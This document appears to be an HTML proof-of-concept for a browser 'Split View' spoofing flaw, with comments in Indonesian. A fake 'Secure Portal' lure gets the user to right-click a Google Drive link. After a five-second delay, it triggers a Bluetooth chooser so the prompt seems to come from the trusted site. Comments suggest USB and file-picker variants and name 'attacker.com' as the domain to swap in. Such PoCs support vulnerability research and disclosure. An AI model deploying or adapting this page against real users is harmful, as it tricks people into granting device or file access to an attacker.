<!doctype html>
<html>
  <head>
    <title>Split View Spoofing PoC</title>
    <style>
      body {
        text-align: center;
        font-family: sans-serif;
        padding-top: 50px;
        background: #f8f9fa;
      }
      #link {
        display: inline-block;
        padding: 15px;
        background: #1a73e8;
        color: white;
        text-decoration: none;
        border-radius: 5px;
        font-weight: bold;
        cursor: context-menu;
        transition: background 0.3s;
      }
      #status {
        margin-top: 20px;
        color: #d93025;
        font-weight: bold;
      }
    </style>
  </head>
  <body>
    <h2>Secure Portal: Action Required</h2>
    <a id="link" href="https://drive.google.com" target="_blank">
      🔓 Right-Click here and select "Open link in Split View"
    </a>
    <div id="status">⏳ Action needed...</div>

    <script>
      const statusDiv = document.getElementById("status");
      const TRUSTED_SITE = "https://drive.google.com";
      const MALICIOUS_SITE = "https://attacker.com"; // Ganti dengan domain Anda

      document
        .getElementById("link")
        .addEventListener("contextmenu", function () {
          statusDiv.innerText =
            "Processing request... Switching to secure environment.";

          setTimeout(() => {
            // Di sinilah Anda letakkan API untuk diuji:
            // 1. USB Chooser: navigator.usb.requestDevice({ filters: [...] })
            // 2. Bluetooth Chooser: navigator.bluetooth.requestDevice({ acceptAllDevices: true })
            // 3. File Picker (FS Access): showOpenFilePicker()
            try {
              // Contoh: Memicu Bluetooth Chooser
              navigator.bluetooth
                .requestDevice({ acceptAllDevices: true })
                .then((device) => console.log("Device selected:", device))
                .catch((error) => console.log("Request failed:", error));
              statusDiv.innerText =
                "📡 Dialog triggered! Check the split view tab.";
            } catch (e) {
              console.error("Failed to trigger:", e);
            }
          }, 5000);
        });
    </script>
  </body>
</html>
